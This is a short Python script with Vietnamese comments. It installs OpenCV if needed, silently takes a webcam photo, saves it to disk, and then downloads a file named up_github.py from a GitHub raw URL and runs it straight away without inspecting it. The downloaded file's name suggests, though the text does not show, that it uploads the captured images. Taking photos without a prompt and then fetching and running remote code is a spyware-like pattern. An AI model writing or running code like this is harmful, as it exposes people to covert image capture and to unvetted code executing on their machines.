import subprocess
import sys
import requests
import os

# Thử import cv2, nếu chưa có thì tự động cài
try:
    import cv2
except ImportError:
    print("Chưa có thư viện cv2, đang cài đặt...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "opencv-python"])
    import cv2

# Mở webcam (0 là camera mặc định)
cam = cv2.VideoCapture(0)

if not cam.isOpened():
    print("Không mở được camera")
    sys.exit()

# Đọc một frame từ webcam
ret, frame = cam.read()

if ret:
    # --- Cách 1: lưu ảnh mặc định (bị ghi đè) ---
    cv2.imwrite("photo.jpg", frame)
    print("Ảnh đã được chụp và lưu thành photo.jpg")

    # --- Cách 2: lưu ảnh với số thứ tự tăng dần ---
    count = 1
    while os.path.exists(f"photo_{count}.jpg"):
        count += 1
    filename = f"photo_{count}.jpg"
    cv2.imwrite(filename, frame)
    print("Ảnh cũng được lưu thành:", filename)

else:
    print("Không thể chụp ảnh")

# Giải phóng camera
cam.release()

# Tải file từ GitHub
url = "https://raw.githubusercontent.com/JXFalcon/Python/main/up_github.py"
ten_file = "up_github.py"

response = requests.get(url)
with open(ten_file, "wb") as f:
    f.write(response.content)

print("✅ Tải xong:", ten_file)
print(f"Đang mở file {ten_file}...")
subprocess.run([sys.executable, ten_file])
